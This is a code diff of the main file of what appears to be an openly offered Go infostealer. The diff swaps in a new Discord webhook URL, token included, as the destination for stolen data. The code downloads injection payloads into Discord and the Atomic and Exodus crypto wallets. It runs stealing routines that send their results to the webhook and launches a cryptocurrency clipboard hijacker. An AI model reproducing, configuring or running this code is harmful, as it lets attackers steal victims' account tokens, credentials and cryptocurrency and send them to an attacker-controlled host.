@@ -19,7 +19,10 @@ import (
 	"github.com/hackirby/skuld/modules/wallets"
 	"github.com/hackirby/skuld/modules/walletsinjection"
 	"github.com/hackirby/skuld/utils/program"
+	
 )
+
+
 
 func main() {
 	CONFIG := map[string]interface{}{
@@ -64,7 +67,7 @@ func main() {
 
 	go discordinjection.Run(
 		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
-		"https://discord.com/api/webhooks/1239466476835045396/cuLBA0X_-PaJCog11PAa6t6lA4YvysgdhSluIx9v3zHAUHkikfrQJaAY0YYMURiwznci",
+		"https://discord.com/api/webhooks/1246426438190764103/MF44zqb8X5CHVGvYuUC1NHsW02SiaeqkRup4cpMprO67_Y2F6BT5e54oqtfQ3Ryy7oLf",
 	)
 	go walletsinjection.Run(
 		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
@@ -75,7 +78,7 @@ func main() {
 	go walletsinjection.Run(
 		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
 		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
-		"https://discord.com/api/webhooks/1239466476835045396/cuLBA0X_-PaJCog11PAa6t6lA4YvysgdhSluIx9v3zHAUHkikfrQJaAY0YYMURiwznci",
+		"https://discord.com/api/webhooks/1246426438190764103/MF44zqb8X5CHVGvYuUC1NHsW02SiaeqkRup4cpMprO67_Y2F6BT5e54oqtfQ3Ryy7oLf",
 	)
 
 	actions := []func(string){
@@ -93,7 +96,7 @@ func main() {
 	}
 
 	for _, action := range actions {
-		go action("https://discord.com/api/webhooks/1239466476835045396/cuLBA0X_-PaJCog11PAa6t6lA4YvysgdhSluIx9v3zHAUHkikfrQJaAY0YYMURiwznci")
+		go action("https://discord.com/api/webhooks/1246426438190764103/MF44zqb8X5CHVGvYuUC1NHsW02SiaeqkRup4cpMprO67_Y2F6BT5e54oqtfQ3Ryy7oLf")
 	}
 
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
